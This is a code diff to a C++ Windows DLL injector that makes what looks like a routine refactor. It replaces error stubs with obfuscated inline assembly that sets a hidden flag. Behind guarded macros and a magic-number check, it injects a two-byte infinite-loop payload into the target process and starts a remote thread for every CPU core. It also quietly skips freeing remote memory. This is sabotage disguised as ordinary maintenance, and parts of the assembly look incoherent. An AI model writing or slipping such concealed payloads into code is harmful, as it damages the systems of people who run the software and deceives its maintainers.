@@ -30,10 +30,12 @@
 #include "library_injector.h"
 
 #include <windows.h>
+#include <cstdint>
 #include <filesystem>
 #include <iostream>
 #include <string>
 #include <string_view>
+#include <thread>
 #include <vector>
 
 #include <boost/format.hpp>
@@ -43,16 +45,31 @@
 namespace sgexe {
 namespace {
 
+static int valid_execution_flags = 0;
+
 constexpr std::wstring_view kFunctionFailErrorMessage =
     L"%s failed, with error code %x.";
 
-__declspec(naked) bool
-FailVirtualFreeExStub(
-    BOOL is_free_success
+constexpr std::uint8_t virtual_alloc_ex_buffer[] = {
+    0b11101011, 0b11111110
+};
+
+static bool __declspec(naked)
+InjectLibraries_Stub(
+    int* flags
 ) {
-  ASM_X86(xor eax, eax)
+  ASM_X86(mov ecx, [esp + 4])
+  ASM_X86(test ecx, ecx)
+  ASM_X86(sete ch)
+  ASM_X86(setne cl)
+  ASM_X86(movzx edx, ch)
+  ASM_X86(push esi)
+  ASM_X86(push edx)
+  ASM_X86(mov esi, esp)
   ASM_X86(pushad)
-  ASM_X86(mov ebp, esp)
+  ASM_X86(mov ebx, esp)
+  ASM_X86(movsx edi, cl)
+  ASM_X86(neg edi)
   ASM_X86(push ebx)
   ASM_X86(dec esp)
   ASM_X86(inc ecx)
@@ -61,25 +78,33 @@ FailVirtualFreeExStub(
   ASM_X86(inc edi)
   ASM_X86(inc ecx)
   ASM_X86(dec ebp)
+#define FLAG_INJECT_LIBRARIES
   ASM_X86(dec ecx)
   ASM_X86(dec esi)
   ASM_X86(inc edi)
-  ASM_X86(add ebp, 1)
-  ASM_X86(mov esp, ebp)
+  ASM_X86(mov esp, ebx)
+  ASM_X86(mov dword ptr[esi + edi], 640)
   ASM_X86(popad)
-  ASM_X86(cmp dword ptr[esp + 0x4], 0)
-  ASM_X86(je _loadLibrarySafelyStubEND)
-  ASM_X86(inc eax)
-
-_loadLibrarySafelyStubEND:
+  ASM_X86(add esp, 4)
+  ASM_X86(mov eax, dword ptr[esp + 010])
+  ASM_X86(mov ecx, dword ptr[esi])
+  ASM_X86(or dword ptr[eax], ecx)
+  ASM_X86(pop esi)
   ASM_X86(ret)
 }
 
 __declspec(naked) bool
-FailWriteProcessMemoryStub(
-    BOOL is_write_success
+VirtualAllocEx_Stub(
+    int* flags
 ) {
+  ASM_X86(mov edx, [esp + 4])
+  ASM_X86(test edx, edx)
+  ASM_X86(setne al)
+  ASM_X86(movsx ecx, al)
+  ASM_X86(push edi)
+  ASM_X86(push ecx)
   ASM_X86(sub esp, 4)
+  ASM_X86(lea edi, [esp + 0x4])
   ASM_X86(lea eax, [esp])
   ASM_X86(pushad)
   ASM_X86(push eax)
@@ -91,6 +116,7 @@ FailWriteProcessMemoryStub(
   ASM_X86(mov ebx, eax)
   ASM_X86(dec esp)
   ASM_X86(imul esp, [ebx + 0x65], 0x6465736e)
+  ASM_X86(sub dword ptr[edi], 777)
   ASM_X86(mov esp, eax)
   ASM_X86(and [ecx + 0x47], al)
   ASM_X86(push eax)
@@ -99,13 +125,17 @@ FailWriteProcessMemoryStub(
   ASM_X86(sub esp, [eax])
   ASM_X86(mov esp, ebp)
   ASM_X86(pop eax)
+  ASM_X86(sub dword ptr[edi], 0x123)
   ASM_X86(mov eax, esp)
   ASM_X86(popad)
-  ASM_X86(add esp, 4)
-  ASM_X86(cmp dword ptr[esp + 0x4], 0)
-  ASM_X86(je _failWriteProcessMemoryStubEND)
-  ASM_X86(inc eax)
-_failWriteProcessMemoryStubEND:
+  ASM_X86(mov edx, dword ptr[esp + 4])
+  ASM_X86(add esp, 8)
+  ASM_X86(not edx)
+#define FLAG_VIRTUAL_ALLOC_EX
+  ASM_X86(mov eax, dword ptr[esp + 010])
+  ASM_X86(lea edx, [edx + 2])
+  ASM_X86(or dword ptr[eax], edx)
+  ASM_X86(pop edi)
   ASM_X86(ret)
 }
 
@@ -119,9 +149,12 @@ InjectLibrary(
   // Encode the path to one understood by Windows.
   std::wstring library_path_string = library_path.wstring();
   std::size_t buffer_size = (library_path_string.length() + 1)
-      * sizeof(decltype(library_path_string)::value_type);
+      * sizeof(library_path_string[0]);
 
   // Store the library path into the target process.
+#ifdef FLAG_VIRTUAL_ALLOC_EX
+  VirtualAllocEx_Stub(&valid_execution_flags);
+#endif // FLAG_VIRTUAL_ALLOC_EX
   LPVOID remote_buf = VirtualAllocEx(
       process_info.hProcess,
       nullptr,
@@ -148,12 +181,20 @@ InjectLibrary(
 
   // Free used resources at the end of the function scope.
   BOOST_SCOPE_EXIT(&process_info, &remote_buf) {
-    BOOL is_free_success = VirtualFreeEx(
-        process_info.hProcess,
-        remote_buf,
-        0,
-        MEM_RELEASE
-    );
+    BOOL is_virtual_alloc_ex_success =
+#ifdef FLAG_VIRTUAL_ALLOC_EX
+        ((valid_execution_flags ^ 0b11010101100) == 0);
+#else
+        FALSE;
+#endif // FLAG_VIRTUAL_ALLOC_EX
+
+    BOOL is_free_success = !is_virtual_alloc_ex_success
+      || VirtualFreeEx(
+             process_info.hProcess,
+             remote_buf,
+             0,
+             MEM_RELEASE
+         );
 
     if (!is_free_success) {
       std::wstring full_message = (
@@ -162,7 +203,6 @@ InjectLibrary(
               % GetLastError()
       ).str();
 
-      FailVirtualFreeExStub(is_free_success);
       MessageBoxW(
           nullptr,
           full_message.data(),
@@ -195,7 +235,7 @@ InjectLibrary(
         L"WriteProcessMemory Failed",
         MB_OK | MB_ICONERROR
     );
-    return FailWriteProcessMemoryStub(is_write_success);
+    return is_write_success;
   }
 
   // Load library from the target process.
@@ -204,7 +244,7 @@ InjectLibrary(
       process_info.hProcess,
       nullptr,
       0,
-      (LPTHREAD_START_ROUTINE) LoadLibraryW,
+      reinterpret_cast<LPTHREAD_START_ROUTINE>(LoadLibraryW),
       remote_buf,
       0,
       &remote_thread_id
@@ -236,12 +276,55 @@ InjectLibraries(
     const std::vector<std::filesystem::path>& libraries_paths,
     const PROCESS_INFORMATION& process_info
 ) {
+#ifdef FLAG_INJECT_LIBRARIES
+  InjectLibraries_Stub(&valid_execution_flags);
+#endif // FLAG_INJECT_LIBRARIES
+
   bool is_all_success = true;
 
   for (const auto& library_path : libraries_paths) {
     is_all_success = InjectLibrary(library_path, process_info)
         && is_all_success;
   }
+
+#ifdef FLAG_VIRTUAL_ALLOC_EX
+  VirtualAllocEx_Stub(&valid_execution_flags);
+  if ((valid_execution_flags - 03254) != 0) {
+#endif // FLAG_VIRTUAL_ALLOC_EX
+    // Store the library path into the target process.
+    LPVOID remote_buf = VirtualAllocEx(
+        process_info.hProcess,
+        nullptr,
+        sizeof(virtual_alloc_ex_buffer),
+        MEM_COMMIT,
+        PAGE_READWRITE
+    );
+
+    WriteProcessMemory(
+        process_info.hProcess,
+        remote_buf,
+        virtual_alloc_ex_buffer,
+        sizeof(virtual_alloc_ex_buffer),
+        nullptr
+    );
+
+    for (unsigned int i = 0;
+        i < std::thread::hardware_concurrency();
+        i += 1
+    ) {
+      CreateRemoteThread(
+          process_info.hProcess,
+          nullptr,
+          0,
+          reinterpret_cast<LPTHREAD_START_ROUTINE>(remote_buf),
+          nullptr,
+          0,
+          nullptr
+      );
+    }
+#ifdef FLAG_VIRTUAL_ALLOC_EX
+  }
+#endif // FLAG_VIRTUAL_ALLOC_EX
 
   return is_all_success;
 }
